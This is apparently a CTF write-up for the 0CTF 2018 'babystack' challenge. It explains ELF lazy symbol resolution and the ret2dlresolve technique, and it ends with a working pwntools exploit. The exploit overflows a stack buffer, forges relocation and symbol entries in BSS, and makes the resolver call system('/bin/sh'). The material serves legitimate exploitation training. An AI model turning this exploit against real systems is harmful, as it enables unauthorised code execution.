---
title: "[pwn] babystack"
categories:
  - CTF/pwn
tags:
  - bof
  - ret2dlresolve_x86
---

0CTF18

[file](https://github.com/vietd0x/ctf-writeups/raw/main/babystack.tar.gz)
### checksec

```r
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

```c
int vuln()
{
  char buf[40]; // [esp+0h] [ebp-28h] BYREF
  return read(0, buf, 64u);
}
```

obviously, it’s a trivial bof, but we don’t have any emit funcs to leak. No libc provided, so no offset calculation possible.

# lazy linking

---

### JMPREL (.rel.plt)

Stores a table called `Relocation table`. Each entry maps to a symbol.

```c
typedef uint32_t Elf32_Addr; 
typedef uint32_t Elf32_Word; 
typedef struct{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel;
 
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```

The type of these entries is `Elf32_Rel`, which is defined as it follows. The size of one entry is **8** bytes.

```bash
$ readelf -r babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entry:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

Let's take a look at our table:

- The column Name gives the name of our symbol: `read@GLIBC_2.0`;
- Offset is the address of the GOT entry for the symbol: `0x0804a00c`;
- Info stores additional metadata such as `ELF32_R_SYM` or `ELF32_R_TYPE`;

According to the defined MACROS, `ELF32_R_SYM(r_info) == 1` and `ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)`. Keep in mind that `R_SYM` is 1, we will use it later. 

### STRTAB (.dynstr)

STRTAB is a simple table that stores the strings for symbols name.

```r
0x804822C ; ELF String Table
0x804822C byte_804822C    db 0
0x804822D aLibcSo6        db 'libc.so.6',0
0x8048237 aIoStdinUsed    db '_IO_stdin_used',0
0x8048246 aRead           db 'read',0
0x804824B aAlarm          db 'alarm',0
0x8048251 aLibcStartMain  db '__libc_start_main',0
0x8048263 aGmonStart      db '__gmon_start__',0
0x8048272 aGlibc20        db 'GLIBC_2.0',0
```

### SYMTAB (.dynsym)

This table holds relevant symbol information. Each entry is a `Elf32_Sym` structure and its size is `16` bytes.

```c
typedef struct { 
   Elf32_Word st_name ; /* Symbol name (string tbl index) -4b*/
   Elf32_Addr st_value ; /* Symbol value -4b*/ 
   Elf32_Word st_size ; /* Symbol size -4b*/ 
   unsigned char st_info ; /* Symbol type and binding-1b */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 -1b */ 
   Elf32_Section st_shndx ; /* Section index -2b*/ 
} Elf32_Sym;
```

The first field, `st_name`, gives the offset in `STRTAB`
 where the name of the symbol begins. The other fields of this structure are not used in the exploit, so I will ignore them. The `ELF32_R_SYM(r_info) == 1` variable (which we got from the JMPREL table) gives the **index** of the `Elf32_Sym` in SYMTAB for the specified symbol. In this particular case, index is `1`. Let's analyze this entry.

```r
> x/4wx 0x80481cc + (1*16) # SYMTAB+(index + sizeof(entry) 
# where index = ELF32_R_SYM(r_info)
0x80481dc:  0x0000001a  0x00000000  0x00000000  0x00000012

> x/s 0x804822c + 0x1a # STRTAB + st_name
0x8048246:  "read" # addr and its symbol name respectively
```

Adding the first `dword` from elf32_sym to STRTAB gives the address of the symbol name.

### _dl_runtime_resolve

```r
pwndbg> x/3i 0x8048300 # read@plt
0x8048300 <read@plt>:    jmp   DWORD PTR ds:0x804a00c # read@got.plt
0x8048306 <read@plt+6>:  push  0x0 # reloc_arg
0x804830b <read@plt+11>: jmp   0x80482f0

pwndbg> x/wx 0x804a00c
0x804a00c <read@got.plt>: 0x08048306 # not resolved, points back to .plt

pwndbg> x/2i 0x80482f0 # plt default stub
0x80482f0:  push  DWORD PTR ds:0x804a004 # push link_map
0x80482f6:  jmp   DWORD PTR ds:0x804a008 # jmp _dl_runtime_resolve
pwndbg> x/wx 0x804a008
0x804a008:  0xf7fe7b10 # _dl_runtime_resolve

pwndbg> x/12i 0xf7fe7b10
0xf7fe7b10:  endbr32
0xf7fe7b14:  push   eax
0xf7fe7b15:  push   ecx
0xf7fe7b16:  push   edx
0xf7fe7b17:  mov    edx,DWORD PTR [esp+0x10]
0xf7fe7b1b:  mov    eax,DWORD PTR [esp+0xc]
0xf7fe7b1f:  call   0xf7fe17d0 # _dl_fixup
0xf7fe7b24:  pop    edx
0xf7fe7b25:  mov    ecx,DWORD PTR [esp]
0xf7fe7b28:  mov    DWORD PTR [esp],eax
0xf7fe7b2b:  mov    eax,DWORD PTR [esp+0x4]
0xf7fe7b2f:  ret    0xc
```

1. after `call read@plt` , the program read GOT val frrom (0x804a00c) and jmp back into PLT section.
2. push the parameter 0x0 (`relog_arg`/`rel_offset`) to stack.
3. Push extra parameter (`link_map`) and jmps to resolver.

The process specified above is equivalent to the following function call: `_dl_runtime_resolve (link_map , rel_offset`/`relog_arg)`

The `rel_offset` gives the offset of the `Elf32_Rel` in JMPREL table. `Link_map` (0x804a004) is nothing but a list with all the loaded libraries.

`_dl_runtime_resolve` uses this list to resolve the symbol. After relocating the symbol and its entry in SYMTAB populated, the initial call of read will be invoked. The pseudocode below summarize the process described until now:

```c
// call of unresolved read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
    Elf32_Sym * sym_entry = &SYMTAB[ELF32_R_SYM(rel_entry->r_info)];
    char * sym_name = STRTAB + sym_entry->st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}
```

```
_dl_runtime_resolve(link_map, rel_offset)
                                       +
          +-----------+                |
          | Elf32_Rel | <--------------+
          +-----------+
     +--+ | r_offset  |        +-----------+
     |    |  r_info   | +----> | Elf32_Sym |
     |    +-----------+        +-----------+      +----------+
     |      .rel.plt           |  st_name  | +--> | system\0 |
     |                         |           |      +----------+
     v                         +-----------+        .dynstr
+----+-----+                      .dynsym
| <system> |
+----------+
  .got.plt
```

- fake `Elf32_Rel`
    - `r_offset` writable (after resolving symbol write the actual address of function)
    - `r_info` high 24 bits
        - `(r_info >> 8) * 16` point to fake `Elf32_Sym` (16 is size of `Elf32_Sym`)
    - `r_info` low 8 bits
        - must be `0x07` (R_386_JMP_SLOT)
- fake `Elf32_Sym`
    - `.dynstr + st_name` point to `system` string

Read the fake `Elf32_Rel`、`Elf32_Sym` structures and ret2main to call `_dl_runtime_resolve`.

- use `plt0`

```c
Disassembly of section .plt:
080482f0 <read@plt-0x10>: // plt0
80482f0: push   DWORD PTR ds:0x804a04// push link_map
80482f6: jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve
```

We can calculate the `reloc_arg` to make `.rel.plt + reloc_arg` point to our fake structures and jump to `plt0`, let it resolve symbol to `system`.

After resolving the symbol, `_dl_runtime_resolve` will call the function.

# Strategy

---

The main idea is to provide a big `rel_offset` such that the `rel_entry` to be found within our controllable area. We can craft forged structures for `Elf32_Rel`and `Elf32_Sym` that will force the `_dl_runtime_resolve` to bind the `system` function symbol. The key is that the index of the corresponding pseudo-entry should be calculated correctly. It is important not to forget that our function will be called after being resolved, so the parameter for the `system` function should already be on the stack before calling the resolver.

For **demonstration purposes only**, let us suppose that:

- JMPREL @ `0x0`
- SYMTAB @ `0x100`
- STRTAB @ `0x200`
- controllable area @ `0x300`

We need to craft our `Elf32_Rel` and `Elf32_Sym` somewhere within the controllable area and provide a `rel_offset` such that the resolver reads our special forged structures. Let's suppose that the controllable (stack after pivotation ??? ) are has the following layout.

```
	     +------------+
r_offset     |GOT         |  0x300     
r_info       |0x2100      |  0x304
alignment    |AAAAAAAA    |  0x308
st_name      |0x120       |  0x310
st_value     |0x0         |
st_size      |0x0         |
others       |0x12        |
sym_string   |"system\x00"|  0x320
             +------------+
```

When `_dl_runtime_resolve(link_map , 0x300)` is called, the 0x300 offset is used to get the `Elf32_Rel* rel = JMPREL + 0x300 == 0x300`.
Secondly, the Elf32_Sym is accessed using the `r_info` field from 0x304. `Elf32_Sym* sym = &SYMTAB[(0x2100 >> 8)] == 0x310`.
The last step is to compute the address of the symbol string. This is done by adding `st_name` to `STRTAB : const char *name = STRTAB + 0x120 == 0x320`.
**Note** that SYMTAB access its entries as an array, therefore ELF32_sym should be aligned to 0x10 bytes. Now that we control `st_name`, we can basically force the resolver to relocate `system` and call `system('sh')` .

# POC

---

```python
#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    return process([exe] + argv, *a, **kw)

exe = './babystack'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# push link_map & call dl_resolve
PLT0 = elf.get_section_by_name(".plt")["sh_addr"]
BSS = elf.get_section_by_name(".bss")["sh_addr"]
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag,["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

vuln = 0x804843b
leave_ret = 0x080483a8

io = start()

payload2_size = 44

#____STATE 1: call read(0, bss, size), then ret to vuln________
payload1 = flat({
  44: [
    elf.sym.read,
    vuln,         # After the read call, return to vuln
    0,            # stdin
    BSS,          # place to write forge .rel.plt and .dynsym
    payload2_size,
  ]
})
io.send(payload1)

#____STATE 2: Set up forge area in BSS section_________________
dynsym_idx = ((BSS + (0x4*3)) - SYMTAB) // 0x10
r_info = (dynsym_idx << 8) | 0x7

# Calculate the offset from the start of dynstr section 
# to our dynstr entry
dynstr_offset = (BSS + (0x4*7)) - STRTAB

payload2 = flat({
  0: [
    # .rel.plt
    elf.got.alarm,  # r_offset
    r_info,         # r_info
    0,              # r_addend

    # .dynsym
    dynstr_offset,  # st_name
    p32(0)*3,       # other

    b'system\x00\x00',

    b'/bin/sh\x00',
  ]
})
io.send(payload2)

#____STATE 3: call PLT0 (resolver) = system('/bin/sh')_________
binsh_addr = BSS + 12 + 16 + 8
# Calculate the .rel.plt offset
rel_plt_offset = BSS - JMPREL

payload3 = flat({
  44:[
    PLT0,           # calling the functions for resolving
    rel_plt_offset, # .rel.plt offset
    0xdeadbeef,     # The return address after resolving
    binsh_addr,     # argument
  ]
})
io.send(payload3)
io.interactive()
```

[another detail wu](https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html)
